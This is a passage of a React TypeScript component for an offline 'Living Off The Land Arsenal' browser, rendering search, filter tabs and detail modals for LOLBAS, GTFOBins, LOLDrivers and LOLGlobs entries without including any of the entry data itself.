                    <p className="font-medium text-slate-300">{selectedItem.Verified}</p>
                  </div>
                  <div className="bg-slate-950 p-3 rounded-lg border border-slate-800">
                    <span className="text-xs text-slate-500">Version</span>
                    <p className="font-medium text-slate-300">{selectedItem.Version}</p>
                  </div>
                  <div className="bg-slate-950 p-3 rounded-lg border border-slate-800">
                    <span className="text-xs text-slate-500">Created</span>
                    <p className="font-medium text-slate-300">{selectedItem.Created}</p>
                  </div>
                </div>

                {selectedItem.CVE && selectedItem.CVE.length > 0 && (
                  <div>
                    <h3 className="font-semibold text-slate-300 mb-2 flex items-center gap-2">
                      <ShieldAlert className="w-4 h-4 text-red-400" />
                      CVE References
                    </h3>
                    <div className="flex flex-wrap gap-2">
                      {selectedItem.CVE.map((cve: string, idx: number) => (
                        <span key={idx} className="px-3 py-1 bg-red-500/10 text-red-400 rounded-full text-sm font-mono border border-red-500/20">
                          {cve}
                        </span>
                      ))}
                    </div>
                  </div>
                )}

                <div className="flex flex-wrap gap-2">
                  <h3 className="font-semibold text-slate-300 mb-2 w-full flex items-center gap-2">
                    <TagIcon className="w-4 h-4 text-slate-400" />
                    Tags
                  </h3>
                  {selectedItem.Tags?.map((tag: string, idx: number) => (
                    <span key={idx} className="px-2 py-1 bg-slate-800 text-slate-400 rounded text-xs">
                      {tag}
                    </span>
                  ))}
                </div>

                <div>
                  <h3 className="font-semibold text-slate-300 mb-3 flex items-center gap-2">
                    <Binary className="w-4 h-4 text-slate-400" />
                    Known Vulnerable Samples ({selectedItem.KnownVulnerableSamples?.length || 0})
                  </h3>
                  <div className="space-y-3 max-h-64 overflow-y-auto">
                    {selectedItem.KnownVulnerableSamples?.map((sample: any, idx: number) => (
                      <div key={idx} className="bg-slate-950 border border-slate-800 rounded-lg p-3">
                        <div className="flex items-center justify-between mb-2">
                          <span className="font-mono text-sm text-red-400">{sample.Filename}</span>
                          <span className="text-xs text-slate-500">{sample.MachineType}</span>
                        </div>
                        <div className="space-y-1 text-xs">
                          <div className="flex justify-between">
                            <span className="text-slate-500">SHA256:</span>
                            <span className="font-mono text-slate-400 truncate max-w-xs" title={sample.SHA256}>
                              {sample.SHA256.substring(0, 32)}...
                            </span>
                          </div>
                          <div className="flex justify-between">
                            <span className="text-slate-500">Publisher:</span>
                            <span className="text-slate-400">{sample.Publisher || 'Unknown'}</span>
                          </div>
                          {sample.Signature && (
                            <div className="flex justify-between">
                              <span className="text-slate-500">Signature:</span>
                              <span className="text-green-400">{sample.Signature}</span>
                            </div>
                          )}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>

                {selectedItem.Resources && selectedItem.Resources.length > 0 && (
                  <div>
                    <h3 className="font-semibold text-slate-300 mb-2 flex items-center gap-2">
                      <BookOpen className="w-4 h-4 text-slate-400" />
                      Resources
                    </h3>
                    <ul className="space-y-1">
                      {selectedItem.Resources.map((res: string, idx: number) => (
                        <li key={idx}>
                          <a href={res} target="_blank" rel="noopener noreferrer" className="text-sm text-blue-400 hover:text-blue-300 hover:underline truncate block">
                            {res}
                          </a>
                        </li>
                      ))}
                    </ul>
                  </div>
                )}

                {selectedItem.Detection && selectedItem.Detection.length > 0 && (
                  <div>
                    <h3 className="font-semibold text-slate-300 mb-2 flex items-center gap-2">
                      <Eye className="w-4 h-4 text-slate-400" />
                      Detection
                    </h3>
                    <ul className="space-y-2">
                      {selectedItem.Detection.map((det: string, idx: number) => (
                        <li key={idx} className="text-sm text-slate-400 bg-slate-950 p-2 rounded border border-slate-800 flex items-start gap-2">
                          <span className="text-blue-400">•</span>
                          {det}
                        </li>
                      ))}
                    </ul>
                  </div>
                )}
              </>
            )}

            {/* Globs Specific */}
            {isGlob && (
              <>
                <div className="bg-green-500/10 border border-green-500/20 rounded-lg p-4">
                  <h3 className="font-semibold text-green-400 mb-2 text-2xl font-mono">{selectedItem.extension}</h3>
                  <p className="text-slate-300">{selectedItem.description}</p>
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div className="bg-slate-950 p-3 rounded-lg border border-slate-800">
                    <span className="text-xs text-slate-500">Handler</span>
                    <p className="font-medium text-slate-300 font-mono">{selectedItem.handler || 'N/A'}</p>
                  </div>
                  <div className="bg-slate-950 p-3 rounded-lg border border-slate-800">
                    <span className="text-xs text-slate-500">Risk Level</span>
                    <p className={`font-medium ${
                      selectedItem.risk === 'Critical' ? 'text-red-400' :
                      selectedItem.risk === 'High' ? 'text-orange-400' :
                      selectedItem.risk === 'Medium' ? 'text-yellow-400' :
                      'text-green-400'
                    }`}>{selectedItem.risk || 'Unknown'}</p>
                  </div>
                </div>

                <div className="flex flex-wrap gap-2">
                  <h3 className="font-semibold text-slate-300 mb-2 w-full flex items-center gap-2">
                    <TagIcon className="w-4 h-4 text-slate-400" />
                    Tags
                  </h3>
                  {selectedItem.tags?.map((tag: string, idx: number) => (
                    <span key={idx} className="px-2 py-1 bg-slate-800 text-slate-400 rounded text-xs">
                      {tag}
                    </span>
                  ))}
                </div>

                {selectedItem.mitre && selectedItem.mitre.length > 0 && (
                  <div>
                    <h3 className="font-semibold text-slate-300 mb-2 flex items-center gap-2">
                      <Shield className="w-4 h-4 text-amber-400" />
                      MITRE ATT&CK
                    </h3>
                    <div className="flex flex-wrap gap-2">
                      {selectedItem.mitre.map((technique: string, idx: number) => (
                        <span key={idx} className="px-2 py-1 bg-amber-500/10 text-amber-400 rounded text-sm font-mono border border-amber-500/20">
                          {technique}
                        </span>
                      ))}
                    </div>
                  </div>
                )}

                {selectedItem.detection && selectedItem.detection.length > 0 && (
                  <div>
                    <h3 className="font-semibold text-slate-300 mb-2 flex items-center gap-2">
                      <Eye className="w-4 h-4 text-slate-400" />
                      Detection Rules
                    </h3>
                    <ul className="space-y-2">
                      {selectedItem.detection.map((rule: string, idx: number) => (
                        <li key={idx} className="text-sm text-slate-400 bg-slate-950 p-2 rounded border border-slate-800 flex items-start gap-2">
                          <span className="text-blue-400">•</span>
                          {rule}
                        </li>
                      ))}
                    </ul>
                  </div>
                )}

                <div className="flex items-center gap-2 text-sm">
                  <ExternalLink className="w-4 h-4 text-slate-400" />
                  <span className="text-slate-400">Reference:</span>
                  <a 
                    href="https://0xv1n.github.io/LOLGlobs/" 
                    target="_blank" 
                    rel="noopener noreferrer"
                    className="text-blue-400 hover:text-blue-300 hover:underline"
                  >
                    LOLGlobs Project
                  </a>
                </div>
              </>
            )}
          </div>

          <div className="p-6 border-t border-slate-800 flex justify-end">
            <button 
              onClick={() => setSelectedItem(null)}
              className="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-lg transition-colors"
            >
              Close
            </button>
          </div>
        </div>
      </div>
    );
  };

  // Help Modal
  const renderHelpModal = () => {
    if (!showHelp) return null;
    return (
      <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm">
        <div className="bg-slate-900 border border-slate-700 rounded-xl max-w-2xl w-full max-h-[80vh] overflow-y-auto">
          <div className="p-6 border-b border-slate-800 flex justify-between items-center">
            <h2 className="text-xl font-bold text-white flex items-center gap-2">
              <HelpCircle className="w-5 h-5" />
              About Offline LOL Arsenal
            </h2>
            <button onClick={() => setShowHelp(false)} className="text-slate-400 hover:text-white">
              <X className="w-6 h-6" />
            </button>
          </div>
          <div className="p-6 space-y-4 text-slate-300 text-sm">
            <p>
              This is an <strong>offline-first</strong> Living Off The Land reference tool containing embedded data from:
            </p>
            <ul className="list-disc list-inside space-y-2 ml-4">
              <li><strong className="text-blue-400">LOLBAS Project</strong> - Windows binaries, scripts, and libraries for defense evasion</li>
              <li><strong className="text-yellow-400">GTFOBins</strong> - Unix binaries for privilege escalation and command execution</li>
              <li><strong className="text-red-400">LOLDrivers</strong> - Vulnerable and malicious Windows drivers</li>
              <li><strong className="text-green-400">LOLGlobs</strong> - Dangerous file extensions and handlers</li>
            </ul>
            <div className="bg-slate-800 p-4 rounded-lg border border-slate-700">
              <h3 className="font-semibold text-white mb-2">Data Sources (Online References)</h3>
              <ul className="space-y-1 text-xs font-mono">
                <li>• https://lolbas-project.github.io/</li>
                <li>• https://gtfobins.github.io/</li>
                <li>• https://www.loldrivers.io/</li>
                <li>• https://0xv1n.github.io/LOLGlobs/</li>
              </ul>
            </div>
            <p className="text-xs text-slate-500">
              All data is embedded in this application for offline/airgapped environment usage. Use the Export button to save a JSON backup.
            </p>
          </div>
        </div>
      </div>
    );
  };

  return (
    <div className="p-6 space-y-6 max-w-7xl mx-auto">
      {/* Header */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div>
          <h1 className="text-2xl font-bold bg-gradient-to-r from-white to-gray-400 bg-clip-text text-transparent">
            Living Off The Land Arsenal
          </h1>
          <p className="text-gray-400 text-sm mt-1">
            Complete offline database of LOLBAS, GTFOBins, LOLDrivers & LOLGlobs
            <span className="ml-2 text-xs px-2 py-0.5 rounded bg-green-500/20 text-green-400 border border-green-500/30">OFFLINE</span>
          </p>
        </div>
        
        <div className="flex items-center gap-3">
          <button
            onClick={() => setShowHelp(true)}
            className="px-4 py-2 rounded-lg text-sm font-medium transition-all flex items-center gap-2 bg-white/5 border border-white/10 hover:bg-white/10"
          >
            <HelpCircle className="w-4 h-4" />
            Help
          </button>
          <button
            onClick={exportData}
            className="px-4 py-2 rounded-lg text-sm font-medium transition-all flex items-center gap-2 bg-white/5 border border-white/10 hover:bg-white/10"
          >
            <Download className="w-4 h-4" />
            Export
          </button>
        </div>
      </div>

      {/* Navigation Tabs */}
      <div className="flex gap-2 border-b border-white/10">
        {[
          { id: 'lolbas', label: 'LOLBAS', icon: Terminal, count: LOLBAS_DATA.length },
          { id: 'gtfo', label: 'GTFOBins', icon: Code, count: GTFOBINS_DATA.length },
          { id: 'drivers', label: 'LOLDrivers', icon: HardDrive, count: DRIVERS_DATA.length },
          { id: 'globs', label: 'LOLGlobs', icon: FileText, count: GLOBS_DATA.length }
        ].map(({ id, label, icon: Icon, count }) => (
          <button
            key={id}
            onClick={() => {
              setActiveTab(id as any);
              setFilterCategory('all');
              setFilterMitre('');
            }}
            className={`px-4 py-2 text-sm font-medium border-b-2 transition-colors flex items-center gap-2 ${
              activeTab === id 
                ? 'border-cyan-400 text-cyan-400' 
                : 'border-transparent text-gray-400 hover:text-gray-200'
            }`}
          >
            <Icon className="w-4 h-4" />
            <span>{label}</span>
            <span className="text-xs px-1.5 py-0.5 rounded-full bg-white/10">
              {count}
            </span>
          </button>
        ))}
      </div>

      {/* Search and Filters - Glass Card Style */}
      <div className="glass-card p-4">
        <div className="flex flex-col md:flex-row gap-4">
          <div className="flex-1 relative">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-500" />
            <input
              type="text"
              placeholder={`Search ${activeTab === 'lolbas' ? 'Windows binaries, commands...' : activeTab === 'gtfo' ? 'Unix binaries, functions...' : activeTab === 'drivers' ? 'Driver names, CVEs, hashes...' : 'File extensions, handlers...'}`}
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              className="w-full pl-10 pr-4 py-2 bg-black/40 border border-white/10 rounded-lg text-white placeholder-gray-500 focus:border-cyan-400 focus:outline-none"
            />
          </div>
          
          <div className="flex gap-2">
            <select
              value={filterCategory}
              onChange={(e) => setFilterCategory(e.target.value)}
              className="px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-sm text-gray-300 outline-none focus:border-cyan-400"
            >
              <option value="all">All Categories</option>
              {getCategories().map(cat => (
                <option key={cat} value={cat}>{cat}</option>
              ))}
              {activeTab === 'drivers' && <option value="verified">Verified Only</option>}
            </select>

            {(activeTab === 'lolbas' || activeTab === 'globs') && (
              <input
                type="text"
                placeholder="MITRE ATT&CK..."
                value={filterMitre}
                onChange={(e) => setFilterMitre(e.target.value)}
                className="px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-sm text-gray-300 placeholder-gray-500 outline-none focus:border-cyan-400 w-32"
              />
            )}
          </div>
        </div>

        {/* Stats Bar */}
        <div className="mt-4 pt-4 border-t border-white/10 flex items-center gap-4 text-sm">
          <span className="text-gray-400">
            Showing {
              activeTab === 'lolbas' ? filteredLOLBas.length :
              activeTab === 'gtfo' ? filteredGTFO.length :
              activeTab === 'drivers' ? filteredDrivers.length :
              filteredGlobs.length
            } of {
              activeTab === 'lolbas' ? LOLBAS_DATA.length :
              activeTab === 'gtfo' ? GTFOBINS_DATA.length :
              activeTab === 'drivers' ? DRIVERS_DATA.length :
              GLOBS_DATA.length
            } entries
          </span>
          {searchQuery && (
            <button 
              onClick={() => setSearchQuery('')}
              className="text-xs px-2 py-1 rounded bg-white/10 text-gray-400 hover:bg-white/20 transition-colors"
            >
              Clear search
            </button>
          )}
        </div>
      </div>

        {/* Content Grid */}
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          {activeTab === 'lolbas' && filteredLOLBas.map((item) => (
            <div 
              key={item.name}
              onClick={() => setSelectedItem(item)}
              className="glass-card p-5 cursor-pointer transition-all hover:-translate-y-1 hover:border-cyan-400/30 group"
            >
              <div className="flex items-start justify-between">
                <div className="flex-1 min-w-0">
                  <div className="flex items-center gap-2 mb-2">
                    <div className="p-2 rounded-lg bg-blue-500/10">
                      <Terminal className="w-5 h-5 text-blue-400" />
                    </div>
                    <h3 className="font-mono text-lg font-semibold text-blue-400">
                      {item.name}
                    </h3>
                    {item.category && (
                      <span className="text-xs px-2 py-0.5 rounded border bg-white/5 border-white/10 text-gray-400">
                        {item.category}
                      </span>
                    )}
                  </div>
                  <p className="text-sm mb-3 text-gray-400 line-clamp-2">
                    {item.description}
                  </p>
                  <div className="flex items-center gap-3 text-xs">
                    <span className="text-gray-500">
                      <span className="text-gray-400">{item.commands?.length || 0}</span> commands
                    </span>
                    <span className="text-gray-600">•</span>
                    <span className="text-gray-500">
                      {item.detection?.length || 0} detection rules
                    </span>
                  </div>
                </div>
                <ChevronRight className="w-5 h-5 mt-1 text-gray-600 group-hover:text-gray-400 transition-colors" />
              </div>
              {item.commands && item.commands[0] && (
                <div className="mt-3 pt-3 border-t border-white/10">
                  <code className="text-xs text-gray-500 font-mono truncate block">
                    {item.commands[0].command.substring(0, 60)}{item.commands[0].command.length > 60 ? '...' : ''}
                  </code>
                </div>
              )}
            </div>
          ))}

          {activeTab === 'gtfo' && filteredGTFO.map((item) => (
            <div 
              key={item.name}
              onClick={() => setSelectedItem(item)}
              className="glass-card p-5 cursor-pointer transition-all hover:-translate-y-1 hover:border-yellow-400/30 group"
            >
              <div className="flex items-start justify-between">
                <div className="flex-1 min-w-0">
                  <div className="flex items-center gap-2 mb-2">
                    <div className="p-2 rounded-lg bg-yellow-500/10">
                      <Code className="w-5 h-5 text-yellow-400" />
                    </div>
                    <h3 className="font-mono text-lg font-semibold text-yellow-400">
                      {item.name}
                    </h3>
                  </div>
                  <p className="text-sm mb-3 text-gray-400">
                    {item.description}
                  </p>
                  <div className="flex flex-wrap gap-2">
                    {item.functions.slice(0, 4).map((func, idx) => (
                      <span key={idx} className="text-xs px-2 py-1 rounded border bg-yellow-500/10 text-yellow-400 border-yellow-500/20">
                        {func}
                      </span>
                    ))}
                    {item.functions.length > 4 && (
                      <span className="text-xs px-2 py-1 rounded bg-white/10 text-gray-400">
                        +{item.functions.length - 4} more
                      </span>
                    )}
                  </div>
                </div>
                <ChevronRight className="w-5 h-5 mt-1 text-gray-600 group-hover:text-gray-400 transition-colors" />
              </div>
            </div>
          ))}

          {activeTab === 'drivers' && filteredDrivers.map((item) => (
            <div 
              key={item.Id}
              onClick={() => setSelectedItem(item)}
              className="glass-card p-5 cursor-pointer transition-all hover:-translate-y-1 hover:border-red-400/30 group"
            >
              <div className="flex items-start justify-between">
                <div className="flex-1 min-w-0">
                  <div className="flex items-center gap-2 mb-2">
                    <div className="p-2 rounded-lg bg-red-500/10">
                      <HardDrive className="w-5 h-5 text-red-400" />
                    </div>
                    <h3 className="font-mono text-lg font-semibold text-red-400">
                      {item.Id}
                    </h3>
                    <span className={`text-xs px-2 py-0.5 rounded border ${
                      item.Category === 'malicious driver' 
                        ? 'bg-red-500/10 text-red-400 border-red-500/20' 
                        : 'bg-orange-500/10 text-orange-400 border-orange-500/20'
                    }`}>
                      {item.Category}
                    </span>
                    {item.Verified === "TRUE" && (
                      <span className="text-xs px-2 py-0.5 rounded bg-green-500/10 text-green-400 border border-green-500/20 flex items-center gap-1">
                        <Shield className="w-3 h-3" /> Verified
                      </span>
                    )}
                  </div>
                  <p className="text-sm mb-3 text-gray-400 line-clamp-2">
                    {item.Description}
                  </p>
                  <div className="flex flex-wrap gap-2 mb-3">
                    {item.CVE?.slice(0, 2).map((cve, idx) => (
                      <span key={idx} className="text-xs px-2 py-0.5 rounded font-mono bg-white/10 text-amber-400">
                        {cve}
                      </span>
                    ))}
                  </div>
                  <div className="flex items-center gap-3 text-xs">
                    <span className="text-gray-500">
                      <span className="text-gray-400">{item.KnownVulnerableSamples?.length || 0}</span> samples
                    </span>
                    <span className="text-gray-600">•</span>
                    <span className="text-gray-500">
                      {item.Tags?.slice(0, 3).join(', ')}
                    </span>
                  </div>
                </div>
                <ChevronRight className="w-5 h-5 mt-1 text-gray-600 group-hover:text-gray-400 transition-colors" />
              </div>
            </div>
          ))}

          {activeTab === 'globs' && filteredGlobs.map((item) => (
            <div 
              key={item.id}
              onClick={() => setSelectedItem(item)}
              className="glass-card p-5 cursor-pointer transition-all hover:-translate-y-1 hover:border-green-400/30 group"
            >
              <div className="flex items-start justify-between">
                <div className="flex-1 min-w-0">
                  <div className="flex items-center gap-2 mb-2">
                    <div className="p-2 rounded-lg bg-green-500/10">
                      <FileText className="w-5 h-5 text-green-400" />
                    </div>
                    <h3 className="font-mono text-lg font-semibold text-green-400">
                      {item.extension}
                    </h3>
                    <span className={`text-xs px-2 py-0.5 rounded border ${
                      item.risk === 'Critical' ? 'bg-red-500/10 text-red-400 border-red-500/20' :
                      item.risk === 'High' ? 'bg-orange-500/10 text-orange-400 border-orange-500/20' :
                      item.risk === 'Medium' ? 'bg-yellow-500/10 text-yellow-400 border-yellow-500/20' :
                      'bg-green-500/10 text-green-400 border-green-500/20'
                    }`}>
                      {item.risk} Risk
                    </span>
                  </div>
                  <p className="text-sm mb-3 text-gray-400">
                    {item.description}
                  </p>
                  <div className="flex flex-wrap gap-2 mb-3">
                    {item.mitre?.slice(0, 3).map((tech, idx) => (
                      <span key={idx} className="text-xs px-2 py-0.5 rounded font-mono bg-white/10 text-amber-400">
                        {tech}
                      </span>
                    ))}
                  </div>
                  <div className="flex items-center gap-2 text-xs">
                    <span className="text-gray-500">
                      Handler: <span className="text-gray-300">{item.handler || 'N/A'}</span>
                    </span>
                  </div>
                </div>
                <ChevronRight className="w-5 h-5 mt-1 text-gray-600 group-hover:text-gray-400 transition-colors" />
              </div>
            </div>
          ))}

          {/* Empty State */}
          {(activeTab === 'lolbas' && filteredLOLBas.length === 0) ||
           (activeTab === 'gtfo' && filteredGTFO.length === 0) ||
           (activeTab === 'drivers' && filteredDrivers.length === 0) ||
           (activeTab === 'globs' && filteredGlobs.length === 0) ? (
            <div className="col-span-full text-center py-12 text-gray-500">
              <Search className="w-12 h-12 mx-auto mb-4 opacity-50" />
              <p className="text-lg font-medium">No results found</p>
              <p className="text-sm">Try adjusting your search or filters</p>
            </div>
          ) : null}
        </div>

      {/* Stats Summary */}
      <div className="glass-card p-4 text-center text-sm text-gray-400">
        <p>
          Offline Living Off The Land Arsenal • 
          LOLBAS: {LOLBAS_DATA.length} • 
          GTFOBins: {GTFOBINS_DATA.length} • 
          LOLDrivers: {DRIVERS_DATA.length} • 
          LOLGlobs: {GLOBS_DATA.length}
        </p>
      </div>

      {/* Modals */}
      {renderDetailModal()}
      {renderHelpModal()}
      
      {/* Toast Notification for Copy */}
      {copiedText && (
        <div className="fixed bottom-4 right-4 bg-green-500 text-white px-4 py-2 rounded-lg shadow-lg flex items-center gap-2 animate-in fade-in slide-in-from-bottom-2 z-50">
          <Check className="w-4 h-4" />
          <span className="text-sm font-medium">Copied to clipboard</span>
        </div>
      )}
    </div>
  );
}

// Helper icon component
function TagIcon({ className }: { className?: string }) {
  return (
    <svg className={className} fill="none" viewBox="0 0 24 24" stroke="currentColor">
      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M7 7h.01M7 3h5c.512 0 1.024.195 1.414.586l7 7a2 2 0 010 2.828l-7 7a2 2 0 01-2.828 0l-7-7A1.994 1.994 0 013 12V7a4 4 0 014-4z" />
    </svg>
  );
}